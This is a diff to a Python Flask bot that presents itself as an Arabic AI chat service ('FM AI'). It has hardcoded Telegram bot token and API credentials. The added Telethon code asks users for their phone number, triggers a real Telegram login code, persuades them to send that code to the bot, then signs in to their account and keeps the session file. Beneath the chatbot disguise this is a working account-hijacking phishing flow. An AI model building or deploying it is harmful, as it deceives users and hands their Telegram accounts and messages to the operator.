@@ -1,11 +1,20 @@
 import os
-import requests
 import json
+import asyncio
+import requests
 from flask import Flask, request
+from telethon import TelegramClient
+from telethon.errors import (
+    SessionPasswordNeededError,
+    PhoneNumberInvalidError,
+    PhoneCodeExpiredError,
+    PhoneCodeInvalidError
+)
+import threading
 
 app = Flask(__name__)
 
-# إعدادات تطبيق Telegram
+# إعدادات تطبيقك من my.telegram.org
 API_ID = 26938834
 API_HASH = "2b04792eff86cad6ba50ca001920fb7d"
 
@@ -13,23 +22,27 @@ API_HASH = "2b04792eff86cad6ba50ca001920fb7d"
 TOKEN = "8490776623:AAFD3Q6th51Y_DDkx0OEj-gVP7U5rpc3HO8"
 BASE_URL = f"https://api.telegram.org/bot{TOKEN}"
 
-# إعدادات خادم الذكاء الاصطناعي
+# إعدادات الذكاء الاصطناعي
 AI_SERVER = "https://kruri.qzz.io/chat/send"
 
-# تخزين المستخدمين
-users = {}  # {chat_id: {phone_hash, phone, code_hash, ...}}
+# تخزين مؤقت للمستخدمين (في الإنتاج: استخدمي قاعدة بيانات)
+users = {}
+clients = {}
 
 def send_message(chat_id, text, reply_markup=None):
+    """إرسال رسالة للمستخدم"""
     payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     if reply_markup:
         payload["reply_markup"] = reply_markup
-    requests.post(f"{BASE_URL}/sendMessage", json=payload)
+    try:
+        requests.post(f"{BASE_URL}/sendMessage", json=payload, timeout=10)
+    except Exception as e:
+        print(f"Error sending message: {e}")
 
 def request_phone_keyboard():
     return {
         "keyboard": [[{"text": "📱 مشاركة رقم الهاتف", "request_contact": True}]],
-        "resize_keyboard": True,
-        "one_time_keyboard": True
+        "resize_keyboard": True
     }
 
 def get_main_keyboard():
@@ -38,111 +51,124 @@ def get_main_keyboard():
             [{"text": "💬 محادثة عادية"}, {"text": "🖼️ إنشاء صورة"}],
             [{"text": "ℹ️ عن البوت"}, {"text": "🔄 إعادة تشغيل"}]
         ],
-        "resize_keyboard": True,
-        "one_time_keyboard": False
+        "resize_keyboard": True
     }
-
-def request_login_code(phone_number):
-    """طلب رمز تحقق حقيقي من Telegram API"""
-    try:
-        response = requests.post(
-            "https://my.telegram.org/auth/send_code",
-            data={
-                "phone": phone_number,
-                "api_id": API_ID,
-                "api_hash": API_HASH
-            },
-            timeout=15
-        )
-        data = response.json()
-        if data.get("_") == "auth.sentCode":
-            return {
-                "success": True,
-                "phone_code_hash": data.get("phone_code_hash", "")
-            }
-        return {"success": False, "error": data.get("_", "Unknown")}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
-
-def verify_login_code(phone_number, phone_code_hash, code):
-    """التحقق من رمز الدخول عبر Telegram API"""
-    try:
-        response = requests.post(
-            "https://my.telegram.org/auth/login",
-            data={
-                "phone": phone_number,
-                "phone_code_hash": phone_code_hash,
-                "phone_code": code,
-                "api_id": API_ID,
-                "api_hash": API_HASH
-            },
-            timeout=15
-        )
-        data = response.json()
-        if data.get("_") == "auth.authorization":
-            return {"success": True}
-        return {"success": False, "error": data.get("_", "Unknown")}
-    except Exception as e:
-        return {"success": False, "error": str(e)}
 
 def get_ai_reply(user_message):
     try:
         response = requests.post(
             AI_SERVER,
-            json={
-                "message": f"أجب باللغة العربية فقط: {user_message}",
-                "model": "llama-3.3-70b-versatile"
-            },
+            json={"message": f"أجب باللغة العربية فقط: {user_message}", "model": "llama-3.3-70b-versatile"},
             headers={"Content-Type": "application/json"},
             timeout=30
         )
-        data = response.json()
-        return data.get("reply", "عذراً، لم أستطع الرد حالياً")
+        return response.json().get("reply", "عذراً، لم أستطع الرد حالياً")
     except:
         return "خطأ في الاتصال بالذكاء الاصطناعي"
+
+# ✅ إنشاء عميل Telethon
+def get_or_create_client(chat_id, phone):
+    if chat_id not in clients:
+        session_name = f"session_{chat_id}"
+        client = TelegramClient(session_name, API_ID, API_HASH)
+        clients[chat_id] = client
+    return clients[chat_id]
+
+# ✅ الخطوة 1: إرسال رمز التحقق
+async def async_send_code(chat_id, phone):
+    try:
+        client = get_or_create_client(chat_id, phone)
+        await client.connect()
+        
+        if await client.is_user_authorized():
+            await client.disconnect()
+            return {"success": False, "error": "هذا الرقم مسجل دخوله بالفعل في جلسة أخرى."}
+
+        sent_code = await client.send_code_request(phone)
+        users[chat_id] = {
+            "phone": phone,
+            "phone_code_hash": sent_code.phone_code_hash,
+            "verified": False,
+            "attempts": 0
+        }
+        return {"success": True, "message": "تم إرسال رمز التحقق"}
+        
+    except PhoneNumberInvalidError:
+        return {"success": False, "error": "رقم الهاتف غير صالح."}
+    except Exception as e:
+        return {"success": False, "error": f"فشل إرسال الرمز: {str(e)}"}
+    
+def send_code_wrapper(chat_id, phone):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    result = loop.run_until_complete(async_send_code(chat_id, phone))
+    loop.close()
+    return result
+
+# ✅ الخطوة 2: التحقق من الرمز وتسجيل الدخول
+async def async_verify_code(chat_id, code):
+    user = users.get(chat_id)
+    if not user:
+        return {"success": False, "error": "انتهت الجلسة، ابدأ من جديد."}
+    
+    try:
+        client = clients.get(chat_id)
+        if not client or not client.is_connected():
+            client = get_or_create_client(chat_id, user['phone'])
+            await client.connect()
+        
+        await client.sign_in(
+            phone=user['phone'],
+            code=code,
+            phone_code_hash=user['phone_code_hash']
+        )
+        
+        user_info = await client.get_me()
+        user["verified"] = True
+        user["user_info"] = {"first_name": user_info.first_name, "username": user_info.username}
+        
+        return {"success": True, "message": "تم تسجيل الدخول بنجاح!"}
+        
+    except PhoneCodeInvalidError:
+        return {"success": False, "error": "الرمز غير صحيح."}
+    except PhoneCodeExpiredError:
+        return {"success": False, "error": "انتهت صلاحية الرمز."}
+    except SessionPasswordNeededError:
+        return {"success": False, "error": "الحساب محمي بكلمة مرور (تحقق بخطوتين)."}
+    except Exception as e:
+        return {"success": False, "error": f"فشل تسجيل الدخول: {str(e)}"}
+
+def verify_code_wrapper(chat_id, code):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    result = loop.run_until_complete(async_verify_code(chat_id, code))
+    loop.close()
+    return result
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
     data = request.get_json()
-    
     if not data or "message" not in data:
         return "OK", 200
     
     chat_id = data["message"]["chat"]["id"]
-    user = users.get(chat_id, {"verified": False, "phone": None, "phone_code_hash": None})
+    user = users.get(chat_id, {"verified": False})
     
-    # ✅ مشاركة جهة الاتصال
+    # ✅ استقبال رقم الهاتف
     if "contact" in data["message"]:
         phone = data["message"]["contact"]["phone_number"]
+        send_message(chat_id, "⏳ <b>جاري إرسال رمز التحقق...</b>")
         
-        send_message(chat_id, "⏳ <b>جاري إرسال رمز التحقق من Telegram...</b>")
-        
-        # طلب رمز حقيقي من Telegram
-        result = request_login_code(phone)
-        
+        result = send_code_wrapper(chat_id, phone)
         if result["success"]:
-            users[chat_id] = {
-                "verified": False,
-                "phone": phone,
-                "phone_code_hash": result["phone_code_hash"],
-                "attempts": 0
-            }
-            send_message(
-                chat_id,
-                f"📱 <b>تم إرسال رمز تحقق حقيقي من Telegram</b>\n\n"
+            send_message(chat_id,
+                f"📱 <b>تم إرسال رمز التحقق!</b>\n\n"
                 f"• رقم الهاتف: <code>+{phone}</code>\n"
-                f"• الرجاء فتح تطبيق Telegram\n"
-                f"• ستجد رسالة من Telegram تحتوي على الرمز\n\n"
-                f"🔐 <b>أرسل الرمز هنا للتأكيد</b>",
-                {"remove_keyboard": True}
-            )
+                f"• <b>افتح تطبيق تلغرام على هاتفك</b>\n"
+                f"• ستجد رمزًا مكونًا من 5 أرقام\n\n"
+                f"🔐 <b>أرسل هذا الرمز هنا الآن:</b>")
         else:
-            send_message(
-                chat_id,
-                f"❌ <b>فشل في إرسال رمز التحقق:</b>\n{result['error']}\n\n"
-                "الرجاء المحاولة لاحقاً",
-                request_phone_keyboard()
-            )
+            send_message(chat_id, f"❌ <b>{result['error']}</b>")
         return "OK", 200
     
     text = data["message"].get("text", "").strip()
@@ -150,88 +176,46 @@ def webhook():
     # ✅ مستخدم غير موثق
     if not user.get("verified"):
         if text == "/start" or text == "🔄 إعادة تشغيل":
-            users[chat_id] = {"verified": False, "phone": None, "phone_code_hash": None, "attempts": 0}
-            send_message(
-                chat_id,
+            users[chat_id] = {"verified": False}
+            send_message(chat_id,
                 "👋 <b>مرحباً بك في بوت FM AI!</b>\n\n"
-                "للاستمرار، يجب تسجيل الدخول عبر Telegram.\n"
+                "للاستمرار، يجب تسجيل الدخول الآمن عبر تلغرام.\n"
                 "الرجاء مشاركة رقم هاتفك 👇",
-                request_phone_keyboard()
-            )
+                request_phone_keyboard())
         
-        # التحقق من رمز الدخول الحقيقي
-        elif user.get("phone_code_hash") and text.isdigit() and len(text) >= 5:
+        elif user.get("phone_code_hash") and text.isdigit():
             send_message(chat_id, "⏳ <b>جاري التحقق من الرمز...</b>")
-            
-            result = verify_login_code(
-                user["phone"],
-                user["phone_code_hash"],
-                text
-            )
+            result = verify_code_wrapper(chat_id, text)
             
             if result["success"]:
-                users[chat_id]["verified"] = True
-                send_message(
-                    chat_id,
-                    "✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
-                    "🎉 أهلاً بك في بوت FM AI!\n"
-                    "اختر من الأزرار أدناه للبدء 👇",
-                    get_main_keyboard()
-                )
+                send_message(chat_id,
+                    f"✅ <b>تم تسجيل الدخول بنجاح!</b>\n\n"
+                    f"🎉 أهلاً بك في بوت FM AI!\n"
+                    f"اختر من الأزرار أدناه للبدء 👇",
+                    get_main_keyboard())
             else:
-                users[chat_id]["attempts"] += 1
-                if users[chat_id]["attempts"] >= 3:
-                    users[chat_id] = {"verified": False, "phone": None, "phone_code_hash": None, "attempts": 0}
-                    send_message(
-                        chat_id,
-                        "❌ <b>تم تجاوز عدد المحاولات!</b>\n\n"
-                        "الرجاء إعادة تشغيل البوت /start",
-                        {"remove_keyboard": True}
-                    )
+                user["attempts"] = user.get("attempts", 0) + 1
+                if user["attempts"] >= 3:
+                    users[chat_id] = {"verified": False}
+                    send_message(chat_id, "❌ <b>تم تجاوز عدد المحاولات.</b> ابدأ من جديد /start")
                 else:
-                    send_message(
-                        chat_id,
-                        f"❌ <b>رمز التحقق غير صحيح!</b>\n"
-                        f"لديك {3 - users[chat_id]['attempts']} محاولات متبقية.\n"
-                        "تأكد من الرمز المرسل من Telegram"
-                    )
+                    send_message(chat_id, f"❌ <b>{result['error']}</b>\nالمحاولات المتبقية: {3 - user['attempts']}")
         return "OK", 200
     
-    # ✅ مستخدم موثق
-    requests.post(f"{BASE_URL}/sendChatAction", json={
-        "chat_id": chat_id, "action": "typing"
-    })
+    # ✅ مستخدم موثق (البوت يعمل)
+    import threading
+    threading.Thread(target=lambda: requests.post(f"{BASE_URL}/sendChatAction", json={"chat_id": chat_id, "action": "typing"})).start()
     
     if text == "/start" or text == "🔄 إعادة تشغيل":
-        send_message(
-            chat_id,
-            "👋 <b>مرحباً بك في بوت FM AI!</b>\n\n"
-            f"• معرف التطبيق: <code>{API_ID}</code>\n"
-            "• الذكاء: Llama 3.3 70B\n"
-            "• المطور: مريم محمد 🛡️\n\n"
-            "اختر من الأزرار أدناه 👇",
-            get_main_keyboard()
-        )
-    
+        name = user.get("user_info", {}).get("first_name", "مستخدم")
+        send_message(chat_id, f"👋 <b>مرحباً بك يا {name}!</b>\n\nاختر من الأزرار أدناه 👇", get_main_keyboard())
     elif text == "ℹ️ عن البوت":
-        send_message(
-            chat_id,
-            "🤖 <b>بوت FM AI</b>\n\n"
-            f"• رقم الهاتف: <code>+{user['phone']}</code>\n"
-            f"• معرف التطبيق: <code>{API_ID}</code>\n"
-            f"• اسم التطبيق: <code>krory.iq</code>\n"
-            f"• الاسم المختصر: <code>KRARAPP</code>\n"
-            "• النسخة: 1.0\n"
-            "• المطور: مريم محمد 🛡️",
-            get_main_keyboard()
-        )
-    
+        phone = user.get('phone', 'غير معروف')
+        send_message(chat_id, f"🤖 <b>بوت FM AI</b>\n\n• رقم الهاتف: <code>+{phone}</code>\n• الذكاء: Llama 3.3 70B\n• المطور: مريم محمد 🛡️", get_main_keyboard())
     elif text == "💬 محادثة عادية":
         send_message(chat_id, "تم تفعيل وضع المحادثة 💬\nاكتب رسالتك!", get_main_keyboard())
-    
     elif text == "🖼️ إنشاء صورة":
         send_message(chat_id, "تم تفعيل وضع إنشاء الصور 🖼️\nاكتب وصف الصورة!", get_main_keyboard())
-    
     else:
         reply = get_ai_reply(text)
         send_message(chat_id, reply, get_main_keyboard())
@@ -240,12 +224,7 @@ def webhook():
 
 @app.route("/")
 def home():
-    return json.dumps({
-        "app": "FM AI Bot",
-        "api_id": API_ID,
-        "app_title": "krory.iq",
-        "status": "running"
-    }), 200
+    return "FM AI Bot is running with Telethon", 200
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
